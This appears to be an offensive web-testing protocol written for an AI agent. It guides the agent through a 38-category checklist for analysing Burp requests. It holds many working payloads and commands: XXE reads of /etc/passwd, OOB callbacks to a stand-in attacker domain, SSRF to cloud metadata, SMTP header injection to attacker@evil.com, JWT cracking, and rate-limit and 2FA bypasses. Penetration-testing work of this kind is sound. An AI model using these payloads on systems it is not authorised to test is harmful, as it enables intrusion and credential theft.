# Haunt — HauntMode Analysis Protocol
# This is the exact procedure to follow when analyzing a Burp request.
# Do NOT skip steps. Do NOT skip categories. Leave nothing on the table.

---

## PHASE 0 — SETUP
Before analyzing, read:
1. `INDEX.md` — already done if you're reading this
2. Keep the INDEX.md open as your lookup table throughout the analysis

**OOB channel:** For any blind testing (blind XSS, blind SSRF, blind CMDi, blind XXE), establish the callback domain upfront:
- Blind XSS / cookie stealing: `YOUR_EZXSS_DOMAIN` (ezXSS) — use unique `?param=fieldname` in every payload so you know which injection point fired
- Blind SSRF / XXE / CMDi OOB: use Burp Collaborator (if Pro) or `YOUR_EZXSS_DOMAIN` or a `nc -lvnp` listener
- Record your OOB domain before starting — don't improvise it mid-test

---

## PHASE 1 — REQUEST DISSECTION
Parse and document every component of the request:

```
METHOD:          [GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS/CONNECT]
URL:             [full URL including query string]
PATH:            [path only]
QUERY PARAMS:    [name=value pairs]
HEADERS:         [all non-standard + security-relevant headers]
COOKIES:         [all cookies with names]
CONTENT-TYPE:    [if body present]
BODY:            [raw body, note format: JSON/XML/form-data/multipart/plain]
BODY PARAMS:     [extracted key=value pairs]
AUTH:            [Bearer/Basic/Cookie/API key/none]
SESSION TOKEN:   [location + format + entropy observation]
```

Security-relevant headers to flag explicitly:
- `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Real-IP`
- `Origin`, `Referer`
- `Content-Type`, `Transfer-Encoding`
- `Authorization`
- `User-Agent` (if app behaves differently per UA)
- Any custom `X-` headers

---

## PHASE 2 — RESPONSE CONTEXT (if available)
Note:
- Status code and what it indicates
- Response `Content-Type`
- `Set-Cookie` headers (flags: Secure, HttpOnly, SameSite)
- Caching headers: `X-Cache`, `CF-Cache-Status`, `Cache-Control`, `Age`, `Vary`
- `Access-Control-*` headers
- Server/technology disclosure headers
- Whether any request input is reflected in the response and WHERE

---

## PHASE 3 — TECHNOLOGY FINGERPRINT
Identify from headers, cookies, paths, errors:
- Web server (Apache/Nginx/IIS/Tomcat/Jetty)
- Language/framework (PHP/Python/Java/Node.js/Ruby/.NET)
- CMS (WordPress/Drupal/Joomla)
- Template engine signals
- Database signals (SQL errors, MongoDB errors)
- Cloud infrastructure (AWS metadata, GCP, Azure)
- CDN/proxy layer (Cloudflare, Varnish, Fastly)

---

## PHASE 3.5 — RESPONSE BASELINE
Before injecting anything, record the normal response:
```
NORMAL STATUS:   [200/302/etc]
NORMAL SIZE:     [body byte count]
NORMAL TIME:     [response time in ms]
REFLECTS INPUT:  [yes/no — which fields echo back in response]
ERROR VERBOSITY: [generic / framework error / stack trace / DB error]
```
This baseline is critical for:
- Detecting blind injection (timing attacks, size changes)
- Spotting filter differences (blocked vs allowed payloads)
- Differential analysis between valid and invalid inputs

---

## PHASE 4 — ATTACK SURFACE MAP
List every injection point:
1. Each query parameter
2. Each body parameter
3. Each JSON field (including nested)
4. Each cookie value
5. HTTP headers (Host, User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host, X-Real-IP, X-*)
6. URL path segments
7. File names (if upload)
8. Content-Type value
9. JSON/XML structure itself (not just values)
10. `multipart/form-data` field names (not just values)
11. WebSocket message fields (if applicable)

**Also note:** which fields appear in GET responses but are absent from the POST/PUT request — these are mass assignment candidates.

---

## PHASE 5 — VULNERABILITY CHECKLIST
**Go through EVERY item. Mark each: [APPLIES] [MAYBE] [NO]**
**For every [APPLIES] and [MAYBE]: invoke the corresponding skill and execute full test methodology.**

### 5.01 SQL INJECTION
- [ ] Any param that could reach a DB query?
- [ ] Numeric ID params? String search params? Login form?
- [ ] ORDER BY, sort, filter parameters?
- [ ] Error messages referencing SQL?
- **If APPLIES → invoke skill `sqli`, run SQLMap + manual payloads, test blind, test time-based**

### 5.02 NOSQL INJECTION
- [ ] MongoDB/NoSQL indicators in tech stack?
- [ ] JSON body with operator-like fields?
- [ ] Login form with JSON params?
- [ ] `application/json` content type?
- **If APPLIES → invoke skill `nosqli`, test operator injection, auth bypass, SSJI**

### 5.03 COMMAND INJECTION
- [ ] Any param passed to a system command?
- [ ] File processing, ping, DNS lookup, conversion features?
- [ ] Filenames, paths, host values reaching backend commands?
- [ ] API endpoint that wraps OS functionality?
- **If APPLIES → invoke skill `cmdi`, test all operators (;|&&||newline), blind OOB**

### 5.04 XSS
- [ ] Any input reflected in HTML response?
- [ ] Search, comment, name, profile fields?
- [ ] URL params rendered in page?
- [ ] JSON response consumed by JS with innerHTML/document.write?
- [ ] Error messages echoing input?
- **If APPLIES → invoke skill `xss`, test stored/reflected/DOM, test CSP bypass, test filter evasion**

### 5.05 CSRF
- [ ] State-changing action (POST/PUT/DELETE/PATCH)?
- [ ] Cookie-based session?
- [ ] CSRF token absent, predictable, or not validated?
- [ ] `SameSite` not set to Strict/Lax?
- [ ] Origin/Referer validation missing or bypassable?
- **If APPLIES → invoke skill `csrf`, generate PoC, test all bypass methods, test CORS-assisted**

### 5.06 IDOR / ACCESS CONTROL
- [ ] Numeric/GUID/predictable object IDs in URL, params, or body?
- [ ] Actions reference other users' resources?
- [ ] `/api/users/123`, `?id=`, `uid=`, `doc_id=`, `order_id=`?
- [ ] Encoded references (base64, hashed IDs)?
- [ ] Can a lower-privilege user reach higher-privilege endpoints?
- **If APPLIES → invoke skill `idor`, enumerate IDs, test horizontal + vertical, check encoded refs**

### 5.07 SSRF
- [ ] URL, path, dest, redirect, uri, src, href, fetch, import, load params?
- [ ] Image/file fetching from external URL?
- [ ] Webhook / callback URL parameter?
- [ ] PDF/report generation with URL input?
- [ ] Any param that could trigger a server-side HTTP request?
- **If APPLIES → invoke skill `ssrf`, then work through this sequence:**
  - **Basic confirm:** `http://<your-nc-listener>:8080` — did the server connect back?
  - **Cloud metadata:** `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP), `http://169.254.169.254/metadata/instance` (Azure)
  - **Internal port scan:** `ffuf -w ports.txt -u "http://TARGET/load?q=http://127.0.0.1:FUZZ" -fs <baseline_size>`
  - **Filter bypass — if blocked, try all of these:**
    - Alternate localhost forms: `127.1`, `0.0.0.0`, `0`, `[::]`, `::1`, `::ffff:127.0.0.1`
    - Decimal: `2130706433` | Octal: `0177.0000.0000.0001` | Hex: `0x7f000001`
    - External domain resolving to 127.0.0.1: `localtest.me`
    - HTTP redirect bypass: host `<?php header('Location: http://127.0.0.1/flag');?>` on your server, supply your server URL
    - DNS rebinding: if resolve-then-check gap exists (see §33)
  - **Protocol switching (if urllib/requests used):** `file:///etc/passwd`, `ftp://internal/`, `dict://127.0.0.1:6379/`, `gopher://`
  - **Blind SSRF:** point at `YOUR_EZXSS_DOMAIN` or Collaborator — confirm via OOB callback

### 5.08 SSTI
- [ ] Input reflected in rendered template context?
- [ ] Template engine signals in response (Jinja2, Twig, etc.)?
- [ ] "Hello [input]" style responses?
- [ ] `{{7*7}}` → `49`? `${7*7}` → `49`?
- **If APPLIES → invoke skill `ssti`, use detection polyglot, identify engine, escalate to RCE**

### 5.09 FILE INCLUSION (LFI/RFI)
- [ ] `page=`, `file=`, `template=`, `view=`, `lang=`, `include=` params?
- [ ] File extension in parameter value?
- [ ] PHP application?
- [ ] `../` traversal patterns accepted?
- **If APPLIES → invoke skill `lfi`, test path traversal, PHP filters/wrappers, log poisoning, RFI if allow_url_include**

### 5.10 FILE UPLOAD
- [ ] `multipart/form-data` with file content?
- [ ] `filename=` in Content-Disposition?
- [ ] File type validation present (test bypass)?
- [ ] Where does uploaded file get stored/served?
- **If APPLIES → invoke skill `file-upload`, test MIME bypass, extension bypass, double extension, polyglot, magic bytes**

### 5.11 HTTP REQUEST SMUGGLING
- [ ] Request goes through front-end proxy or CDN?
- [ ] HTTP/1.1 with chunked encoding possible?
- [ ] HTTP/2 downgrade possible?
- [ ] Any inconsistency in how Content-Length vs Transfer-Encoding might be handled?
- **If APPLIES → invoke skill `request-smuggling`, test all variants:**
  - **CL.TE:** front-end uses Content-Length, back-end uses Transfer-Encoding
  - **TE.CL:** front-end uses Transfer-Encoding, back-end uses Content-Length
  - **TE.TE obfuscation** — try all of these to confuse one parser:
    - `Transfer-Encoding: testchunked` (substring match)
    - `Transfer-Encoding : chunked` (space in header name)
    - `Transfer-Encoding:[\x09]chunked` (horizontal tab)
    - `Transfer-Encoding:[\x0b]chunked` (vertical tab)
    - `Transfer-Encoding:  chunked` (leading space)
  - **H2.CL** (HTTP/2 downgrade): inject `Content-Length: 0` in HTTP/2 request body — web server uses it after rewrite
  - **H2.TE:** inject obfuscated `Transfer-Encoding` header in HTTP/2 pseudo-headers
  - **Tool:** Burp HTTP Request Smuggler extension for automated detection

### 5.12 CRLF INJECTION
- [ ] User input reflected in HTTP response headers?
- [ ] Redirect parameter echoed in Location header?
- [ ] Set-Cookie contains user-controlled value?
- [ ] Log entries contain user input?
- [ ] Contact form / email functionality where user-supplied `name`/`email`/`subject` may appear in SMTP headers?
- **If APPLIES → invoke skill `crlf`, inject %0d%0a in all header-reflected params, test response splitting, log injection**
  - **SMTP header injection:** inject `%0d%0aCc: attacker@evil.com` or `%0d%0aBcc: attacker@evil.com` in email/name fields; send a dummy header after payload to avoid appended-char issues: `evil@x.com%0d%0aCc: you@evil.com%0d%0aDummy: x`

### 5.13 WEB CACHE POISONING
- [ ] Caching layer present (`X-Cache`, `Age`, `CF-Cache-Status`)?
- [ ] Unkeyed headers accepted (`X-Forwarded-Host`, `X-Original-URL`)?
- [ ] Input reflected in cacheable response?
- [ ] `Cache-Control` allows caching of dynamic content?
- **If APPLIES → invoke skill `cache-poisoning`, work through:**
  - **Identify cache key:** add cache-buster param (`?cb=RANDOM`) — if each unique value causes cache miss, you can test safely
  - **Find unkeyed params:** change `ref=test1` → `ref=test2` — if second request still hits cache, `ref` is unkeyed and injectable
  - **Find unkeyed headers:** try `X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded`, `X-Host`, `X-Forwarded-Server` — check if any appear in response
  - **Fat GET:** add body to a GET request — `GET /index.php?param=legit HTTP/1.1` + body `param=injected` — some servers process body, cache keys only URL
  - **Parameter cloaking:** `GET /?language=en&cb=BUST;language=<PAYLOAD>` — semicolon tricks server to see injected value, cache sees only first
  - **Tool:** `./wcvs -u http://TARGET/ -gr` (web cache vulnerability scanner)

### 5.14 HOST HEADER INJECTION
- [ ] Host header reflected in response (especially in links, form actions)?
- [ ] Password reset link generated server-side from Host value?
- [ ] `X-Forwarded-Host` / `X-Host` accepted and reflected?
- [ ] Routing / virtual host selection based on Host?
- **If APPLIES → invoke skill `cache-poisoning`, test in this order:**
  - Override headers to try (add each individually): `X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded`, `X-Host`, `X-Forwarded-Server`
  - **Password reset poisoning:** trigger reset while injecting `X-Forwarded-Host: attacker.com` — does reset link contain attacker domain?
  - **localhost bypass encoding** (for routing bypass, admin panel access):
    - Decimal: `2130706433` | Hex: `0x7f000001` | Octal: `0177.0000.0000.0001`
    - `127.1`, `0`, `0.0.0.0`, `::1`, `localtest.me`
  - **Fuzzing internal IPs via Host:** `ffuf -u http://TARGET/admin.php -w ips.txt -H 'Host: FUZZ'`

### 5.15 SESSION / AUTH / JWT
- [ ] JWT token (`eyJ` prefix in cookie or Authorization header)?
- [ ] Predictable/weak session token (short, sequential, timestamp-based)?
- [ ] Login endpoint?
- [ ] Registration (username enumeration via timing or distinct error messages)?
- [ ] Password reset endpoint?
- [ ] 2FA / MFA endpoint?
- [ ] Token reuse or leakage?
- [ ] Session token in URL params?
- [ ] Brute-force protection (rate limit, CAPTCHA)?
- [ ] Cookie flags: missing `HttpOnly` (JS-readable → XSS cookie theft)? Missing `Secure` (sent over HTTP)? Missing `SameSite` (CSRF vector)?
- **If APPLIES → invoke skill `auth-bypass`, test:**

  **JWT-specific:**
  - `alg: none` — strip signature, change `alg` to `none` / `None` / `NONE`, remove signature segment
  - Weak secret brute force: `hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt`
  - `kid` header injection: if `kid` is a file path → point at `/dev/null`; if SQL backend → inject SQLi
  - JWKS spoofing: inject `jku` or `x5u` pointing at a JWKS you control
  - Algorithm confusion: RS256 → HS256 using the server's public key as HMAC secret

  **Password reset:**
  - Token brute-force if short/numeric (4–6 digit codes, no lockout)
  - Host header poisoning during reset → reset link delivered to attacker domain
  - Username injection in JSON body: `{"email":"victim@x.com","email":"attacker@x.com"}`
  - Token reuse — does the same token work after first use?
  - No expiry — does a 24hr-old token still work?

  **Brute-force protection bypass:**
  - Rate limit: rotate `X-Forwarded-For` header value per request
  - CAPTCHA: inspect HTML source and API responses for solution leakage
  - IP rotation via `X-Real-IP`, `X-Client-IP`, `True-Client-IP` header variants

  **2FA bypass:**
  - Skip the 2FA step: complete step 1, jump directly to authenticated endpoint
  - Brute-force the 6-digit TOTP with no lockout
  - Reuse an already-consumed code
  - Use the same valid code across different user accounts

### 5.16 SESSION PUZZLING / FIXATION
- [ ] Multi-step authentication flow?
- [ ] Session ID set before authentication completes?
- [ ] Session variables shared across different flows/users?
- [ ] Pre-auth session ID accepted post-auth?
- [ ] Session entropy: is it at least 16 bytes / 64 bits?
- [ ] Default or predictable session variable values?
- **If APPLIES → invoke skill `session-attacks`, test:**
  - Premature session population: cancel/abandon mid-flow and check what was committed to session
  - Session variable re-use: does a session var set in flow A unlock access in flow B?
  - Fixation: supply `?PHPSESSID=AttackerValue` and see if it's accepted post-login
  - Common insecure session defaults: `admin=false`, `role=user`, `authenticated=false` — try flipping them

### 5.17 DESERIALIZATION
- [ ] Base64 blobs in cookies/params that decode to serialized objects?
- [ ] `O:`, `rO0AB`, `AAEAAAD`, `AC ED` magic bytes?
- [ ] `$type`, `__type`, `TypeObject` in JSON?
- [ ] PHP/Python/Java/.NET application with serialized data?
- [ ] YAML processing with object types?
- **If APPLIES → invoke skill `deserialization`, identify language/serializer, craft gadget chain, test RCE**

### 5.18 XPATH INJECTION
- [ ] XML backend or SOAP service?
- [ ] Authentication querying XML data store?
- [ ] Error messages referencing XPath?
- [ ] Parameters that influence XML node selection?
- **If APPLIES → invoke skill `xpath`, test auth bypass (`' or '1'='1`), exfiltrate via boolean/string functions**

### 5.19 LDAP INJECTION
- [ ] Active Directory / LDAP authentication?
- [ ] Enterprise SSO with directory backend?
- [ ] User search functionality?
- [ ] `(uid=`, `(cn=` in error messages?
- **If APPLIES → invoke skill `ldap`, test auth bypass, blind data extraction**

### 5.20 PDF / HTML INJECTION
- [ ] Report/invoice/PDF export functionality?
- [ ] User content included in generated documents?
- [ ] wkhtmltopdf/PhantomJS/Puppeteer indicators?
- **If APPLIES → invoke skill `pdf-injection`, test SSRF via PDF generator, HTML injection, file read**

### 5.21 PROTOTYPE POLLUTION
- [ ] Node.js/JavaScript backend?
- [ ] JSON body processed by merge/extend/clone utilities?
- [ ] `__proto__` or `constructor.prototype` accepted in JSON?
- [ ] Client-side JS processing URL params into objects?
- **If APPLIES → invoke skill `prototype-pollution`, test:**
  - Server-side safe identification (non-destructive probes):
    - `{"__proto__":{"status":555}}` → does response return HTTP 555?
    - `{"__proto__":{"parameterLimit":1}}` → does it start ignoring extra params?
    - `{"__proto__":{"content-type":"text/xml"}}` → does Content-Type change?
  - `__proto__[admin]=true`, `constructor.prototype.admin=true`
  - Privilege escalation: poll the vulnerable libraries list from skill for known gadgets
  - Client-side: use Burp DOM Invader, check URL params and JSON parsed by JS

### 5.22 RACE CONDITIONS
- [ ] Gift card/coupon/voucher redemption?
- [ ] Fund transfer or balance modification?
- [ ] Rate-limited actions (login, OTP, password reset)?
- [ ] Any "check then act" logic?
- **If APPLIES → invoke skill `race-conditions`, send parallel requests via Burp Turbo Intruder / single-packet attack**

### 5.23 TYPE JUGGLING
- [ ] PHP application?
- [ ] Comparison operations on user input with hashes or tokens?
- [ ] `0e` prefix in hash values (magic hash)?
- [ ] JSON accepting different types than expected?
- **If APPLIES → invoke skill `type-juggling`, test loose comparison bypasses, magic hash values, array type confusion**

### 5.24 PARAMETER LOGIC BUGS
- [ ] Multi-step checkout, order, or payment flow?
- [ ] Optional parameters that affect pricing/permissions?
- [ ] Negative values, zero values, extreme values accepted?
- [ ] Client-side validation only (JS validates but server doesn't — validation logic disparity)?
- [ ] Front-end hides a field/button based on server data (e.g. "coming soon") but server doesn't re-validate?
- [ ] Two different parameters that should agree but might not?
- [ ] Parameters that are user-supplied but expected to be server-generated (price, discount, role)?
- **If APPLIES → invoke skill `param-logic`, apply "what if I..." thinking to every parameter:**
  - Remove the parameter entirely — what changes?
  - Set it to `null`, `0`, `-1`, `""`, `false`, `undefined`
  - Set it to an extreme value (`9999999`, `0.0001`, `-999`)
  - Supply a different data type (string where integer expected, array where string expected)
  - Send conflicting values: `quantity=1&quantity=-1` or `{"price":100,"price":0}` (duplicate keys)
  - Access a later workflow step directly without completing earlier steps
  - Repeat a step that should only execute once (e.g., apply discount twice)
  - Access a resource flagged as "coming soon" or "unavailable" by supplying its ID directly

### 5.25 WEBSOCKET ATTACKS
- [ ] `Upgrade: websocket` in request?
- [ ] Real-time chat, notifications, live data features?
- [ ] WebSocket handshake request?
- **If APPLIES → invoke skill `websocket`, test CSWH, inject XSS/SQLi via WS messages, check auth on upgrade**

### 5.26 SECOND-ORDER ATTACKS
- [ ] Input stored and used later in a different context?
- [ ] Username/profile data processed by background features?
- [ ] Data imported in step 1 and executed in step 2?
- **If APPLIES → invoke skill `second-order`, inject in storage phase, trigger in execution phase, test all second-order vuln types**

### 5.27 CORS MISCONFIGURATIONS
- [ ] `Access-Control-Allow-Origin` in response?
- [ ] `Origin` header reflected as allowed origin?
- [ ] ACAO set to wildcard `*` with credentials?
- [ ] `null` origin accepted?
- [ ] Subdomain trust that could be exploited?
- **If APPLIES → invoke skill `cors`, test origin reflection, null origin, subdomain CORS, CSRF via CORS**

### 5.28 HTTP VERB TAMPERING
- [ ] Authentication/authorization enforced only on specific methods?
- [ ] OPTIONS showing unexpected methods allowed?
- [ ] REST API endpoint with undocumented methods?
- **If APPLIES → invoke skill `verb-tampering`, send OPTIONS, try all verbs, test HEAD for auth bypass**

### 5.29 SSI / ESI / XSLT INJECTION
- [ ] Apache/Nginx `.shtml` files?
- [ ] Surrogate/ESI headers in response?
- [ ] XSLT transformation endpoints?
- [ ] XML processing pipeline?
- **If APPLIES → invoke skill `ssi-esi-xslt`, test `<!--#exec cmd="id"-->`, ESI includes, XSLT SSRF/RCE**

### 5.30 API / SOAP / GRAPHQL
- [ ] `/api/`, `/v1/`, `/graphql`, `/soap`, WSDL?
- [ ] `SOAPAction` header present?
- [ ] GraphQL query in body?
- [ ] API key authentication?
- **If APPLIES → invoke skill `api-attacks`, test SOAPAction spoofing, API parameter fuzzing, and for GraphQL:**
  - **Introspection:** `{"query":"{__schema{types{name}}}"}` — if enabled, enumerate all types/fields/mutations
  - **Batching (rate-limit bypass):** send array of queries in one request `[{"query":"..."}, {"query":"..."}]` — bypasses per-request rate limits (useful for brute-forcing OTPs via GraphQL mutations)
  - **Alias-based rate limit bypass:** send 100 aliased mutations in one request: `{a1: login(user:"x",pass:"aa") a2: login(user:"x",pass:"ab") ...}`
  - **Depth/complexity DoS:** deeply nested query `{user{friends{friends{friends{id}}}}}`; if no depth limit, server may DoS itself
  - **IDOR via object IDs:** replace numeric/UUID IDs in node queries with other users' IDs

### 5.31 OPEN REDIRECT
- [ ] `redirect=`, `next=`, `return=`, `url=`, `goto=` params?
- [ ] `Location:` header controlled by user input?
- [ ] OAuth callback URL manipulation?
- **If APPLIES → invoke skill `open-redirect`, test redirect to external domain, test for open redirect chained with phishing/SSRF**

### 5.32 INFORMATION DISCLOSURE
- [ ] Verbose error messages / stack traces?
- [ ] Debug endpoints accessible?
- [ ] Source code / backup files accessible?
- [ ] Headers disclosing server/framework/version?
- [ ] Missing security headers: `Strict-Transport-Security` (HSTS), `X-Frame-Options` / `frame-ancestors` CSP (clickjacking), `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, `Referrer-Policy`?
- **If APPLIES → invoke skill `info-disclosure`, check `.git/`, `.env`, `backup.*`, error triggering, source comments**
  - **Security headers audit:** send any request and check response for missing `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`; absence of each is a reportable finding (low/informational)

### 5.33 WORDPRESS
- [ ] `/wp-admin`, `/wp-login.php`, `wp-content`?
- [ ] WordPress cookies (`wordpress_logged_in_*`)?
- [ ] `xmlrpc.php` accessible?
- **If APPLIES → invoke skill `wordpress`, enumerate plugins/themes/users, test xmlrpc, brute force**

### 5.34 DNS REBINDING
- [ ] SSRF filters blocking by IP but resolving hostnames?
- [ ] Time gap between DNS resolution and IP validation?
- [ ] Long-running connection possible?
- **If APPLIES → invoke skill `dns-rebinding`, use singularity/rbndr.us tool, attack timing window**

### 5.35 AJP / PROXY MISCONFIGURATIONS
- [ ] Tomcat/Apache behind Nginx proxy?
- [ ] AJP port accessible?
- [ ] Proxy headers (`X-Forwarded-*`) affecting routing or auth?
- **If APPLIES → invoke skill `ajp-proxy`, test Ghostcat, proxy header injection, AJP exploitation**

### 5.36 XXE (XML EXTERNAL ENTITY)
- [ ] `Content-Type: application/xml` or `text/xml`?
- [ ] SOAP request?
- [ ] File upload accepting `.xml`, `.svg`, `.docx`, `.xlsx`, `.xls`?
- [ ] SAML authentication token (base64-encoded XML)?
- [ ] JSON API that also accepts `Content-Type: application/xml`?
- **If APPLIES → invoke skill `xxe`, test:**
  - Basic read: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
  - SSRF via XXE: entity pointing at `http://169.254.169.254/latest/meta-data/`
  - Blind OOB: `<!ENTITY % xxe SYSTEM "http://YOUR_EZXSS_DOMAIN/">` in parameter entity via external DTD
  - SVG upload: `<image href="file:///etc/passwd"/>` inside uploaded SVG
  - Change `Content-Type` to `application/xml` on a JSON endpoint and re-submit

### 5.37 MASS ASSIGNMENT
- [ ] JSON body to create/update a resource?
- [ ] User registration or profile update endpoint?
- [ ] Fields visible in GET response that don't appear in the POST/PUT form?
- [ ] Any `role`, `admin`, `isAdmin`, `verified`, `credits`, `balance`, `price` fields anywhere?
- **If APPLIES → invoke skill `mass-assignment`, test:**
  - GET the resource first, note ALL fields in the response object
  - Re-submit POST/PUT adding extra fields from the GET response (`"admin":true`, `"role":"admin"`, `"verified":true`, `"credits":9999`, `"price":0`)
  - Try fields that weren't in the GET either: `"isAdmin":1`, `"is_admin":true`, `"permission":"admin"`
  - Check if silently accepted (no error) — then verify the change took effect via another GET

### 5.38 BUSINESS LOGIC FLOW ATTACKS
- [ ] Multi-step process (checkout, onboarding, password reset, account upgrade)?
- [ ] Feature requiring a prerequisite (email verified, subscription active, etc.)?
- [ ] Access-controlled or time-gated resources (coming soon, locked features)?
- [ ] Quantity, price, or discount fields?
- [ ] Any flow where completing step N should be required before step N+1?
- **If APPLIES → invoke skill `business-logic`, think "what if I...":**
  - Access step N+2 directly without completing step N?
  - Complete step 1, change account context (e.g., re-login as different user), resume at step 3?
  - Repeat step N twice — does a discount apply twice? Is a coupon consumed twice?
  - Supply the ID of a "coming soon" / "unavailable" product directly in the cart/purchase request?
  - Set quantity to 0, -1, or a decimal? Set price to 0?
  - Abandon a payment flow mid-way — is any entitlement already granted?
  - Bypass a verification gate by accessing the post-verification URL directly?

---

## PHASE 6 — PRIORITIZED ATTACK PLAN
After completing the checklist, produce:

```
APPLICABLE VULNERABILITIES (ordered by likelihood × impact):
1. [VULN TYPE] — [why it applies] — [specific test to run first]
2. ...

ATTACK SEQUENCE:
Step 1: [specific action with exact payload/tool/method]
Step 2: ...

PARAMETERS UNDER TEST:
- [param name]: [vuln types to test against it]

TOOLS NEEDED:
- [tool]: [purpose]
```

**Chaining matrix — always consider these known high-value combinations:**

| Vuln A | + Vuln B | = Result |
|--------|----------|----------|
| Self-XSS | + CSRF | Attacker-triggered XSS → account takeover |
| XSS | + missing HttpOnly | Session cookie theft |
| XSS | + CORS misconfiguration | Exfiltrate cross-origin authenticated data |
| SSRF | + cloud metadata | Full credential / IAM key exposure |
| SSRF | + CORS | Internal API access from victim browser |
| Open Redirect | + SSRF filter bypass | Redirect to internal service |
| CSRF | + CORS origin reflection | Authenticated requests from any origin |
| IDOR | + Mass Assignment | Privilege escalation to admin |
| XSS (stored) | + admin panel render | Stored XSS → admin account takeover |
| Host Header | + Password Reset | Reset link poisoned to attacker domain |
| Prototype Pollution | + gadget | RCE or privilege escalation |
| Request Smuggling | + XSS | Poison cached response for other users |
| Logic Bug (skip step) | + Payment | Free goods / unpaid entitlement |

---

## PHASE 7 — EXECUTION RULES
1. **Never mark a category NO without explicitly checking the signals.**
2. **If in doubt, mark MAYBE and test anyway — the cost of missing a finding is higher than the cost of one extra test.**
3. **Always invoke the skill for APPLIES categories — never rely on training memory.**
4. **For every test: record what you sent, what came back, and what it means against the baseline.**
5. **Second-order thinking: if input is stored, ask "where does this data get used later and in what context?"**
6. **"What if I...?" — for every flow, ask: what if I skip this step? repeat it? supply a nonsense value? access this while unauthenticated? supply someone else's ID?**
7. **When a test confirms a finding: immediately invoke the skill for that category and go deeper.**
8. **Do not stop at first finding — complete the full 38-item checklist every time.**
9. **Blind tests need OOB — confirm via YOUR_EZXSS_DOMAIN / nc listener before concluding "not vulnerable".**
10. **Always check the chaining matrix in Phase 6 — a finding that looks low-severity alone may be critical when chained.**
